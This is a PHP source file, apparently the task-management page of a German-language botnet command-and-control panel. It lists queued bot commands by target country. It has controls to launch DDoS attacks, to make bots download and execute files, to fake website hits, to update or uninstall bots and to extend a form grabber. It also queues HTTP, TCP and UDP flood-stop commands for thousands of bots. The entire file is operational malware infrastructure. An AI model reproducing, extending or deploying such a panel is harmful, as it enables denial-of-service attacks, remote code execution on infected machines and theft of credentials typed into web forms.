<?php require_once('inc/session.php'); require_once('inc/body.php'); require_once('inc/config.php'); require_once('other/safe.php'); ?>

<script type="text/javascript">
function popUp(URL) {
	day = new Date();
	id = day.getTime();
	eval("page" + id + " = window.open(URL, '" + id + "', 'toolbar=0,scrollbars=0,location=0,statusbar=0,menubar=0,resizable=0,width=547,height=430');");
}
</script>

<?php
echo '<h3>Aufgaben</h3>
		 <table>
		  <tr>
			<th>Kommando</th>
			<th>L&auml;nder</th>
			<th>Befehl freigeben</th>
			<th>Bots/Ausgef&uuml;hrt</th>
			<th>Angenommen</th>
			<th>L&ouml;schen</th>
		  </tr>';
		  
		$query1 = mysql_query("SELECT * FROM tasks");
		while($row = mysql_fetch_array($query1))
		{
		  $split = explode(',', safe_xss($row['countries']));
		  
		  echo '<tr>
				<td>'.safe_xss($row['command']).'</td>
		        <td>';	
				
				if(empty($split[0])){
					echo '<img src="img/flags/00.gif" /> (All)';
				}else{					
					for($i = 0; $i <= 4; $i++){
						echo '<img src="img/flags/'.$split[$i].'.gif" />&nbsp;';
					}
					if(!empty($split[5])){
						echo ' ... [<a href="" onClick="javascript:popUp(\'other/showall.php?id='.safe_xss($row['id']).'\')">show all</a>]';
					}
				}
		  
		  echo '</td>
				<td>'.safe_xss($row['time']).'</td>';
		  
		  
		  if(safe_xss($row['bots']) == safe_xss($row['done'])){
			echo '<td style="background-color: #ABC886">'.safe_xss($row['bots']).' / '.safe_xss($row['done']).'</td>';
		  }else{
			echo '<td style="background-color: #FFC2C2;">'.safe_xss($row['bots']).' / '.safe_xss($row['done']).'</td>';
		  }
		  
		  echo '<td style=""><div style="background-color: #AFDCEC; width: '.percent(safe_xss($row['done']),safe_xss($row['bots'])).'%">'.percent(safe_xss($row['done']),safe_xss($row['bots'])).'%</div></td>';
		  
		  if(safe_xss($row['bots']) != safe_xss($row['done'])){
			echo '<td style=""><a href="befehle.php?cmd='.safe_xss($row['command']).'" onClick="javascript:return(confirm(\'bots != done\nTask '.safe_xss($row['id']).' delete now?\'))"><b style="color: red;"><img src="img/del.png" /></b></a></td>';
		  }else{
			echo '<td style=""><a href="befehle.php?cmd='.safe_xss($row['command']).'" onClick="javascript:return(confirm(\'Task '.safe_xss($row['id']).' delete now?\'))"><b style="color: red;"><img src="img/del.png" /></b></a></td>';
		  }
		  
		  echo '</tr>';
		}
		  
	echo '</table>';
	
	//Del tasks / Add new
	echo '<br />
		  <div style="font-family: Tahoma; font-size: 11px;">
			  <form action="befehle.php" method="get">
				<input type="radio" name="del" value="1" />Alle vollst&auml;ndig ausgef&uuml;hrten Tasks &nbsp;<b>ODER</b>&nbsp;<input type="radio" name="del" value="2" />Alle Tasks &nbsp;<input type="submit" name="deletetasks" class="btn" value="L&ouml;schen" />
			  </form>
		  </div>
		  <h3>Neue Aufgabe</h4>
		  <button onClick="javascript:popUp(\'other/ddos.php\')" class="btn" style="width: 230px;">DDoS Attacke ausf&uuml;hren</button><br /><br />
		  <button onClick="javascript:popUp(\'other/dlex.php\')" class="btn" style="width: 230px;">Datei herunterladen und ausf&uuml;hren</button><br /><br />
		  <button onClick="javascript:popUp(\'other/visit.php\')" class="btn" style="width: 230px;">Website besuchen (Hitfaker)</button><br /><br />		  
		  <button onClick="javascript:popUp(\'other/restart.php\')" class="btn" style="width: 230px;">Bot Neustart</button><br /><br />
		  <button onClick="javascript:popUp(\'other/update.php\')" class="btn" style="width: 230px;">Bot Update</button><br /><br />
		  <button onClick="javascript:popUp(\'other/uninstall.php\')" class="btn" style="width: 230px;">Bot Uninstall</button><br /><br />
		  <button onClick="javascript:popUp(\'other/grabber.php\')" class="btn" style="width: 230px;">FormGrabber erweitern</button>
		  
		  <h4>Stop Flood</h4>
		  <form action="befehle.php" method="post">
		  		<select name="floodtype" size="1" class="box" style="width: 70px;">
					  <option></option>
					  <option value="HTTP" onclick="document.getElementById(\'http\').style.display=\'block\'; document.getElementById(\'tcp\').style.display=\'none\'; document.getElementById(\'udp\').style.display=\'none\';">HTTP</option>
					  <option value="TCP" onclick="document.getElementById(\'http\').style.display=\'none\'; document.getElementById(\'udp\').style.display=\'none\'; document.getElementById(\'tcp\').style.display=\'block\';">TCP</option>	
					  <option value="UDP" onclick="document.getElementById(\'http\').style.display=\'none\'; document.getElementById(\'tcp\').style.display=\'none\'; document.getElementById(\'udp\').style.display=\'block\';">UDP</option><br />
				</select><br /><br />
				
		  <input type="submit" name="stop" class="btn" value="Jetzt Attacke stoppen" />
		  </form>';


	if(isset($_POST['stop'])){
		$floodtype = safe_xss($_POST['floodtype']);

		if($floodtype == 'HTTP'){
			//Floodstop HTTP
			$cmd = '[http_stop]*';
			$countries = '';
			$execute =  date('Y-m-d H:i:s');
			$count = '5000';

			mysql_query("INSERT INTO tasks (command, countries, time, bots) VALUES ('".safe_sql($cmd)."', '".safe_sql($countries)."', '".safe_sql($execute)."', '".safe_sql($count)."')");
			echo '<script>alert("Successfully added");</script><meta http-equiv="refresh" content="0; URL=befehle.php"> ';
		}else if($floodtype == 'TCP'){
			//Floodstop TCP
			$cmd = '[tcp_stop]*';
			$countries = '';
			$execute =  date('Y-m-d H:i:s');
			$count = '5000';

			mysql_query("INSERT INTO tasks (command, countries, time, bots) VALUES ('".safe_sql($cmd)."', '".safe_sql($countries)."', '".safe_sql($execute)."', '".safe_sql($count)."')");
			echo '<script>alert("Successfully added");</script><meta http-equiv="refresh" content="0; URL=befehle.php"> ';
		}else if($floodtype == 'UDP'){
			//Floodstop UDP
			$cmd = '[udp_stop]*';
			$countries = '';
			$execute =  date('Y-m-d H:i:s');
			$count = '5000';

			mysql_query("INSERT INTO tasks (command, countries, time, bots) VALUES ('".safe_sql($cmd)."', '".safe_sql($countries)."', '".safe_sql($execute)."', '".safe_sql($count)."')");
			echo '<script>alert("Successfully added");</script><meta http-equiv="refresh" content="0; URL=befehle.php"> ';
		}
	}

	  
//Delete
if(isset($_GET['cmd'])){
	$cmd = safe_xss($_GET['cmd']);

	mysql_query("DELETE FROM tasks WHERE command = '".safe_sql($cmd)."'");
	mysql_query("DELETE FROM tasks_done WHERE command = '".safe_sql($cmd)."'");
	
	echo '<meta http-equiv="refresh" content="0; URL=befehle.php">'; 
}	

if(isset($_GET['deletetasks'])){
	if(safe_xss($_GET['del']) == '1'){
		$query = mysql_query("SELECT id FROM tasks WHERE bots = done");
		while($row = mysql_fetch_array($query)){
		  $id = safe_xss($row['id']);
		  $result1 = mysql_query("DELETE FROM tasks WHERE id = '".safe_sql($id)."'");
		  $result2 = mysql_query("DELETE FROM tasks_done WHERE id = '".safe_sql($id)."'");
		}
		
		if(!$result1 || !$result2){
			die('<script>alert("Fehler - Kein Task beendet?");</script>
			  <meta http-equiv="refresh" content="0; URL=befehle.php">');
		}else{
			echo '<script>alert("Erfolgreich entfernt");</script>
			  <meta http-equiv="refresh" content="0; URL=befehle.php">';
		}
	}
	
	if($_GET['del'] == '2'){
		$result1 = mysql_query("DELETE FROM tasks");
		$result2 = mysql_query("DELETE FROM tasks_done");

			echo '<script>alert("Erfolgreich entfernt");</script>
				  <meta http-equiv="refresh" content="0; URL=befehle.php">';
	}
} 

function percent($done,$bots){
	return round($done / $bots * 100,2);
}

require_once('inc/footer.php'); ?>